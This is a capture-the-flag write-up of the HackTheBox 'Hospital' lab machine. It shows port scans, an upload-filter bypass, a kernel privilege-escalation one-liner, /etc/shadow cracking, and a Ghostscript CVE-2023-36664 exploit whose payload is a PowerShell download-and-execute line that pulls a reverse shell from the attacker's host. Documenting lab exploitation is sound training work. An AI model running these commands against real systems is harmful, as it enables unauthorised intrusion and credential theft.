---
title: "Hospital Write-Up - HackTheBox"
description: "Medium Seasonal HackTheBox machine"
pubDatetime: 2023-11-26
tags: ["media", "htb", "season3", "file upload", "cve-exploitation"]
---

## Table of contents

## Enumeration

First of all, we do a broad port scan enumeration:

~~~bash
# Nmap 7.94 scan initiated Sat Nov 18 23:39:13 2023 as: /usr/bin/nmap -sS -p- --min-rate 3000 -n -Pn -vvv -oG openPorts 10.10.11.241
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.241 ()	Status: Up
Host: 10.10.11.241 ()	Ports: 22/open/tcp//ssh///, 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 1801/open/tcp//msmq///, 2103/open/tcp//zephyr-clt///, 2105/open/tcp//eklogin///, 2107/open/tcp//msmq-mgmt///, 2179/open/tcp//vmrdp///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 3389/open/tcp//ms-wbt-server///, 5985/open/tcp//wsman///, 6404/open/tcp//boe-filesvr///, 6406/open/tcp//boe-processsvr///, 6407/open/tcp//boe-resssvr1///, 6409/open/tcp//boe-resssvr3///, 6613/open/tcp/////, 6618/open/tcp/////, 8080/open/tcp//http-proxy///, 9389/open/tcp//adws///, 10358/open/tcp/////	Ignored State: filtered (65506)
# Nmap done at Sat Nov 18 23:39:57 2023 -- 1 IP address (1 host up) scanned in 43.92 seconds
~~~

Then we can target the detected ports:

~~~bash
# Nmap 7.94 scan initiated Sat Nov 18 23:40:17 2023 as: nmap -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6613,6618,8080,9389,10358 -sCV -oN target 10.10.11.241
Nmap scan report for 10.10.11.241
Host is up (0.11s latency).

PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-19 05:40:25Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
1801/tcp  open  msmq?
2103/tcp  open  msrpc             Microsoft Windows RPC
2105/tcp  open  msrpc             Microsoft Windows RPC
2107/tcp  open  msrpc             Microsoft Windows RPC
2179/tcp  open  vmrdp?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
6404/tcp  open  msrpc             Microsoft Windows RPC
6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp  open  msrpc             Microsoft Windows RPC
6409/tcp  open  msrpc             Microsoft Windows RPC
6613/tcp  open  msrpc             Microsoft Windows RPC
6618/tcp  open  msrpc             Microsoft Windows RPC
8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
9389/tcp  open  mc-nmf            .NET Message Framing
10358/tcp open  msrpc             Microsoft Windows RPC
...
~~~

## Initial foothold (port 8080)

There is a web service running under port 8080.

![](@assets/HackTheBox/Hospital/index.png)

After creating an account we can upload images. They get uploaded to an `/uploads` folder.

![](@assets/HackTheBox/Hospital/upload.png)

After capturing the upload request with burpsuite I notice there is an extension blacklist but we can bypass it by uploading a **.PHAR** file.

![](@assets/HackTheBox/Hospital/phar_bypass.png)

There are some blocked functions as seen from the phpinfo() output.

![](@assets/HackTheBox/Hospital/disable_funtions.png)

Still can execute system commands with a less php [function](https://www.php.net/manual/en/function.popen.php) called `popen()`.

![](@assets/HackTheBox/Hospital/popen.png)

![](@assets/HackTheBox/Hospital/output.png)

Upload a shell script with wget, give it permissions and execute it.

![](@assets/HackTheBox/Hospital/shell.png)

We receive a shell as `www-data` but in a machine called **webserver**, not hospital.

![](@assets/HackTheBox/Hospital/shell1.png)

### Local privilege escalation

The target is running an ubuntu version with a kernel vulnerable to [CVE-2023-2640 & CVE-2023-32629](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/)

The PoC to obtain a shell as root is pretty straight-forward:

~~~bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'
~~~

Once as root we can read the `/etc/shadow` file to try and crack the `drwilliams` user password as I tested is an user of the main machine:

![](@assets/HackTheBox/Hospital/drwilliams0.png)

![](@assets/HackTheBox/Hospital/hash.png)

![](@assets/HackTheBox/Hospital/drwilliams.png)

## Roundcube (port 443)

Under port 443 there is running a mail service called [roundcube](https://roundcube.net/).

![](@assets/HackTheBox/Hospital/main.png)

We can login reusing user and password from `drwilliams`. We see a mail from **drbrown@hospital.htb** asking us to send an **.eps** file so he can open it with Ghostscript.

![](@assets/HackTheBox/Hospital/eps.png)

## GhostScript exploit

Looking up to exploits regarding Ghostscript I found a recent [critical RCE](https://www.bleepingcomputer.com/news/security/critical-rce-found-in-popular-ghostscript-open-source-pdf-library/) that affects all Ghostscript versions before 10.01.2, and is triggered by opening an **.eps** file. 

I found a PoC on github: [https://raw.githubusercontent.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/main/CVE_2023_36664_exploit.py](https://raw.githubusercontent.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/main/CVE_2023_36664_exploit.py)

~~~bash
❯ wget https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/raw/main/CVE_2023_36664_exploit.py
...
❯ python CVE_2023_36664_exploit.py -g -p "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.82:4444/shell.ps1')" -x eps
[+] Generated EPS payload file: malicious.eps
~~~

>For this to work i will be hosting the `shell.ps1` on a python http server. The payload I used is [powershell-reverse-shell.ps1](https://github.com/martinsohn/PowerShell-reverse-shell/raw/main/powershell-reverse-shell.ps1).

~~~bash
❯ ls
 CVE_2023_36664_exploit.py   malicious.eps   shell.ps1

❯ python3 -m http.server 80                                                                                                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Now I set up my listener and send the exploit to the victim.

![](@assets/HackTheBox/Hospital/send.png)

After a little while I receive the shell and the user flag.

![](@assets/HackTheBox/Hospital/shell2.png)

Looking for interesting files we find the user password in a file inside the `Documents` folder:

![](@assets/HackTheBox/Hospital/password.png)

![](@assets/HackTheBox/Hospital/evil.png)

## Privilege escalation

For privilege escalation it will be very easy.

Looking at the web server folder privileges, notice we have write permissions, so we can simply upload a webshell and run commands as an NT AUTHORITY user:

![](@assets/HackTheBox/Hospital/icacls.png)

![](@assets/HackTheBox/Hospital/shell3.png)

From here we can just send us a shell or simply read the flag.

![](@assets/HackTheBox/Hospital/root.png)

**Happy Hacking!**

